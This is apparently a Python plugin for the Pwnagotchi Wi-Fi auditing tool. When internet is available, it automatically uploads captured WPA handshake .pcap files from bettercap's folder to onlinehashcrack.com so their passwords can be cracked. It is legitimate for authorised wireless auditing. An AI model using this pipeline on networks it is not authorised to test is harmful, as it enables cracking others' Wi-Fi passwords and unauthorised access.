__author__ = '33197631+dadav@users.noreply.github.com'
__version__ = '2.0.0'
__name__ = 'onlinehashcrack'
__license__ = 'GPL3'
__description__ = 'This plugin automatically uploades handshakes to https://onlinehashcrack.com'

import os
import logging
import requests
from pwnagotchi.utils import StatusFile

READY = False
REPORT = StatusFile('/root/.ohc_uploads', data_format='json')
SKIP = list()
OPTIONS = dict()


def on_loaded():
    """
    Gets called when the plugin gets loaded
    """
    global READY

    if 'email' not in OPTIONS or ('email' in OPTIONS and OPTIONS['email'] is None):
        logging.error("OHC: Email isn't set. Can't upload to onlinehashcrack.com")
        return

    READY = True


def _upload_to_ohc(path, timeout=30):
    """
    Uploads the file to onlinehashcrack.com
    """
    with open(path, 'rb') as file_to_upload:
        data = {'email': OPTIONS['email']}
        payload = {'file': file_to_upload}

        try:
            result = requests.post('https://api.onlinehashcrack.com',
                    data=data,
                    files=payload,
                    timeout=timeout)
            if 'already been sent' in result.text:
                logging.warning(f"{path} was already uploaded.")
        except requests.exceptions.RequestException as e:
            logging.error(f"OHC: Got an exception while uploading {path} -> {e}")
            raise e


def on_internet_available(agent):
    """
    Called in manual mode when there's internet connectivity
    """
    global REPORT
    global SKIP
    if READY:
        display = agent.view()
        config = agent.config()
        reported = REPORT.data_field_or('reported', default=list())

        handshake_dir = config['bettercap']['handshakes']
        handshake_filenames = os.listdir(handshake_dir)
        handshake_paths = [os.path.join(handshake_dir, filename) for filename in handshake_filenames if filename.endswith('.pcap')]
        handshake_new = set(handshake_paths) - set(reported) - set(SKIP)

        if handshake_new:
            logging.info("OHC: Internet connectivity detected. Uploading new handshakes to onelinehashcrack.com")

            for idx, handshake in enumerate(handshake_new):
                display.set('status', f"Uploading handshake to onlinehashcrack.com ({idx + 1}/{len(handshake_new)})")
                display.update(force=True)
                try:
                    _upload_to_ohc(handshake)
                    reported.append(handshake)
                    REPORT.update(data={'reported': reported})
                    logging.info(f"OHC: Successfuly uploaded {handshake}")
                except requests.exceptions.RequestException as req_e:
                    SKIP.append(handshake)
                    logging.error("OHC: %s", req_e)
                    continue
                except OSError as os_e:
                    SKIP.append(handshake)
                    logging.error("OHC: %s", os_e)
                    continue

